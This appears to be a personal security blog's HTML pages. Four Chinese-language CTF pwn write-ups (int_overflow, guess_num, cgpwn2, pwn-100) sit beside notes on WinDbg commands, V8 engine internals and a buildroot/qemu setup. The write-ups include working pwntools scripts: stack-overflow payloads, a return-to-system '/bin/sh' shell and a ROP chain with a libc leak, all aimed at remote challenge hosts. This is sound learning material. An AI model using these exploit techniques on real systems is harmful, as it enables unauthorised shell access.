+
+
+
+  
+    <article id="post-攻防世界pwn-int_overflow" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.192Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/">
+        攻防世界 int_overflow
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p>
+<p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p>
+<h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p>
+<p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p>
+<p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p>
+<blockquote>
+<p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p>
+</blockquote>
+<p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p>
+<p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p>
+<p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p>
+<p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p>
+<p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p>
+<p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p>
+<p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p>
+<p>262-0x14-4-4=234</p>
+<p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p>
+<p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p>
+<p>exp:</p>
+<pre><code>from pwn import*
+sh=remote('111.198.29.45',39118)
+sh.recvuntil('Your choice:')
+flag=0x0804868B
+sh.sendline('1')
+sh.recvuntil('username:')
+sh.sendline('z')
+sh.recvuntil('passwd:')
+payload='a'*0x14+'aaaa'+p32(flag)+'a'*234
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界pwn-guess_num" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.190Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/">
+        攻防世界 guess_num
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p>
+<p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" alt="17627983-c6ff7c8db83a9ec7.png"></p>
+<p>进入sub_C3E()函数，确定满足条件即可cat flag。</p>
+<p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" alt="17627983-1e961fbba4dff1bc.png"></p>
+<p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p>
+<blockquote>
+<p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p>
+</blockquote>
+<p>exp:</p>
+<p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" alt="17627983-82da413e439821bd.png"></p>
+<blockquote>
+<p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" alt="17627983-caa9a4e5b8ce9f1a.png"></p>
+<p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p>
+<p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" alt="17627983-93fb0ad7c552854b.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" alt="YnNVrd.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" alt="YnNMPf.png"></p>
+<p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界pwn-cgpwn2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.188Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/">
+        攻防世界 cgpwn2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p>
+<p>name是全局变量，在bss区段，适合写入。</p>
+<p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p>
+<p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p>
+<p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p>
+<pre><code>from pwn import *
+ # p = process('./cgpwn2')
+p = remote("111.198.29.45",32966)
+system_addr = 0x804855A
+bss_addr = 0x804A080
+p.recvuntil('name\n')
+p.sendline("/bin/sh\x00")
+p.recvuntil('here:\n')
+payload = 0x26*'a' +'bbbb'+ p32(system_addr) + p32(bss_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界pwn-100" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.186Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/">
+        攻防世界pwn-100
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳：checksec</p>
+<p><img src="https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png" alt="查壳.PNG"></p>
+<p>64位，无stack,无PIE；</p>
+<p><img src="https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png" alt="1.PNG"></p>
+<p>运行程序，输入字符，无反馈，无限制。</p>
+<p><img src="https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png" alt="漏洞.PNG"></p>
+<p><img src="https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png" alt="漏洞2.PNG"></p>
+<p>ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1.</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。</p>
+<p><img src="https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png" alt="寄存器传参.PNG"></p>
+<p><img src="https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png" alt="IDA查看寄存器.PNG"></p>
+<p>puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即</p>
+<p><code>pop rdi; ret</code><br><code>pop rsi; pop r15; ret</code></p>
+<p><img src="https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png" alt="通过pop控制写入.PNG"></p>
+<blockquote>
+<p>注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数<br>传参顺序默认从后先开始传入。x86 x64一样。</p>
+</blockquote>
+<p>此处需要学习利用寄存器传递参数。</p>
+<blockquote>
+<p>关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。</p>
+</blockquote>
+<p>由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。</p>
+<p>初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：</p>
+<p><img src="https://i.loli.net/2020/05/31/EDtReszWUadf94H.png" alt="初始化.PNG"></p>
+<blockquote>
+<p>程序还需调用一个gadget,后续另起一篇学习</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png" alt="gadget.PNG"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre><code class="#!usr/bin/python"> #coding=utf-8
+from pwn import *
+ # context.log_level = 'debug'
+io = remote('124.126.19.106',46612)
+ # io = process("./pwn-100")
+elf = ELF("./pwn-100")
+rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15
+rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)
+pop_rdi_ret = 0x400763
+ # start_addr = elf.symbols['_start']
+start_addr = 0x400550
+puts_plt = elf.plt['puts']
+read_got = elf.got['read']
+binsh_addr = 0x601000
+def leak(addr):
+  payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)
+  payload = payload.ljust(200, "a")
+  io.send(payload)
+  io.recvuntil("bye~\n")
+  up = ""
+  content = ""
+  count = 0
+  while True:
+    c = io.recv(numb=1, timeout=0.5)
+    count += 1
+    if up == '\n' and c == "":
+        content = content[:-1] + '\x00'
+        break
+    else:
+        content += c
+        up = c
+  content = content[:4]
+  log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex')))
+  return content
+d = DynELF(leak, elf = elf)
+sys_addr = d.lookup('system', 'libc')
+log.info("system_addr =&gt; %#x", sys_addr)
+payload  = "a" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)
+payload += p64(rop2)
+payload += "\x00" * 56  
+payload += p64(start_addr)
+payload  = payload.ljust(200, "a")
+io.send(payload)
+io.recvuntil("bye~\n")
+ # gdb.attach(io)
+io.send("/bin/sh\x00")
+payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)
+payload = payload.ljust(200, "a")
+io.send(payload)
+io.interactive()
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-WinDbg使用整理" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.136Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/">
+        WinDbg使用整理
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><ul>
+<li>.sympath　　//显示设置的符号表路径</li>
+<li>.reload　　　　//此命令主要用于加载符号表。</li>
+<li>.reload /f　　//重新装载模块</li>
+<li>.reload /i　　//强制加载mismatched symbol</li>
+<li>U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度</li>
+<li>db　　//显示一字节的长度。</li>
+<li>dw　　//显示两字节的长度。</li>
+<li>dd　　//显示四字节的长度。</li>
+<li>dq　　//显示八字节的长度。</li>
+<li>dD　　//显示double实数(8字节的长度)。</li>
+<li>df　　//显示float实数(4字节的长度)。</li>
+<li>da     //显示asscii值</li>
+<li>du     //显示unicode值</li>
+<li>ds     //显示ANI_STRING值</li>
+<li>dS     //显示UNICODE_STRING的值</li>
+<li>eb address value　　//在address 这个地址写入一个字节value</li>
+<li>ew address value　　//在address 这个地址写入两字节value</li>
+<li>ed address value　　//在address 这个地址写入四字节字节value</li>
+<li>eq address value　　//在address 这个地址写入八字节字节value</li>
+</ul>
+<h2 id="0x01-对象相关命令"><a href="#0x01-对象相关命令" class="headerlink" title="0x01 对象相关命令"></a>0x01 对象相关命令</h2><ul>
+<li>dt　　//dt命令主要用于查看结构体。</li>
+<li>lm　　//列出模块。</li>
+<li>lm vm 模块名　　//查看模块详细信息。 </li>
+<li>!process 0 0 　　　　//列出系统进程信息</li>
+<li>!process 0 0 进程名  //列出该进程的信息</li>
+<li>!process 0 1 进程名  //列出该进程更加的信息</li>
+<li>!process 0 7 进程名  //列出该进程的详细信息，包括线程的</li>
+<li>.process EPROCESS　　//切入该进程中</li>
+<li>!object 地址　　//显示该地址的对象信息。</li>
+<li>bp address  //在地址address插入断点。</li>
+<li>ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。</li>
+<li>ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。</li>
+<li>bd/be/bc</li>
+<li>bd 断点号 //此命令是关闭断点号所对应的断点 。</li>
+<li>be 断点号 //此命令是开启断点号所对应的断点 。</li>
+<li>bc *　　　//去除所有断点。</li>
+<li>x   //x命令用来模糊查询</li>
+<li>x nt!kes<em>des</em>table*   //样查看SSDT表的地址</li>
+<li>dds 地址 //此命令用来解析某连续地址的函数名。</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-V8漏洞初学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.132Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">
+        V8漏洞初学习
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p>
+<blockquote>
+<p>v8编译后二进制名称叫d8.</p>
+</blockquote>
+<h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p>
+<pre><code>browser/x64.release$ ./d8 --allow-natives-syntax
+V8 version 7.5.0 (candidate)
+d8&gt; var a = [1, 2, 3];
+undefined
+d8&gt; %DebugPrint(a);
+0x2ebcfb54dd41 &lt;JSArray[3]&gt;
+[1, 2, 3]
+d8&gt; %SystemBreak();
+Trace/breakpoint trap (core dumped)
+</code></pre>
+<p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p>
+<p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p>
+<p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p>
+<p><code>source /path/to/gdbinit_v8</code></p>
+<p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p>
+<pre><code>var a = [1,2,3];
+var b = [1.1, 2.2, 3.3];
+var c = [a, b];
+%DebugPrint(a);
+%SystemBreak();  //触发第一次调试
+%DebugPrint(b);
+%SystemBreak();  //触发第二次调试
+%DebugPrint(c);
+%SystemBreak();  //触发第三次调试
+</code></pre>
+<p>gdb运行d8:</p>
+<pre><code>root@kali:~/ctf/browser/x64.release$ gdb ./d8
+pwndbg&gt; set args --allow-natives-syntax ./test.js
+pwndbg&gt; r
+Starting program: x64.release/d8 --allow-natives-syntax ./test.js
+[Thread debugging using libthread_db enabled]
+[New Thread 0x7ff87fde9700 (LWP 18393)]
+[New Thread 0x7ff87f5e8700 (LWP 18394)]
+[New Thread 0x7ff87ede7700 (LWP 18395)]
+0x12e891f8df11 &lt;JSArray[3]&gt;            
+</code></pre>
+<p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p>
+<p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p>
+<p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p>
+<p>telescope命令查看内存数据。</p>
+<p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p>
+<h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p>
+<p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p>
+<p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p>
+<p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p>
+<p>一个对象在内存中布局大致如下：</p>
+<ul>
+<li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li>
+<li>prototype：prototype</li>
+<li>elements:对象元素</li>
+<li>length:元素个数</li>
+<li>properties:属性</li>
+</ul>
+<p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p>
+<p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p>
+<p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p>
+<blockquote>
+<p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p>
+</blockquote>
+<h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.codercto.com/a/81538.html">https://www.codercto.com/a/81538.html</a></p>
+<p>后续需要实践做一下这个ctf题目。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-Ubuntu下buildroot以及qemu环境搭建" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.125Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        Ubuntu下buildroot以及qemu环境搭建
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h1><p>windows 10<br>VMwareWorkstation pro<br>Ubuntu 16.04 x64</p>
+<h1 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h1><pre><code>sudo su
+sudo apt-get remove binwalk
+sudo spt-get update
+sudo apt-get install build-essential autoconf git //获取Git
+git clone https://github.com/devttys0/binwalk
+cd binwalk
+sudo python setup.py install
+sudo ./deps.sh
+</code></pre>
+<h1 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h1><p>安装依赖：</p>
+<p><code>sudo apt-get install libncurses5-dev patch</code></p>
+<p>下载buildroot:</p>
+<p><code>wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz </code></p>
+<pre><code>tar -zxvf buildroot-2020.02.6.tar.gz
+cd buildroot-2020.02.6
+make clean
+make menuconfig
+</code></pre>
+<p>出现配置界面：</p>
+<ul>
+<li>选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序</li>
+<li>在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。</li>
+<li>保存退出</li>
+</ul>
+<p><code>sudo make</code></p>
+<p>静等完成。</p>
+<p>os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。</p>
+<p>测试：</p>
+<pre><code>./mipsel-linux-gcc hello.c -o hello
+./hello //失败
+</code></pre>
+<p>使用file查看，是小端序的mips程序。</p>
+<h1 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h1><pre><code>sudo apt-get install qemu
+sudo apt-get install qemu-user-static
+</code></pre>
+<p>测试hello报错<code>/lib/ld-uClibc.so.0: No such file or directory</code></p>
+<p>是因为没有对应架构的链接库的问题<br>在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，</p>
